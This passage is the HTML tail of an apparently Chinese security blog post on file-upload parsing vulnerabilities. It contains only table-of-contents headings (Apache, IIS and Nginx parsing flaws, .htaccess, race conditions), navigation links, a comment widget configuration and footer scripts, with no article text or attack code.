class="toc-text">本地文件包含解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess-解析"><span class="toc-number">6.3.</span> <span class="toc-text">.htaccess 解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-应用程序解析漏洞及其原理"><span class="toc-number">6.4.</span> <span class="toc-text">web 应用程序解析漏洞及其原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-解析漏洞-（多）"><span class="toc-number">6.4.1.</span> <span class="toc-text">Apache 解析漏洞 （多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS-解析漏洞（少）"><span class="toc-number">6.4.2.</span> <span class="toc-text">IIS 解析漏洞（少）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-解析漏洞（少）"><span class="toc-number">6.4.3.</span> <span class="toc-text">Nginx 解析漏洞（少）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#条件竞争"><span class="toc-number">7.</span> <span class="toc-text">条件竞争</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/">&lt; sql注入</a><a class="next" href="/2019/11/21/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">文件读取 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2023 <a href="/." rel="nofollow">zhiliya</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>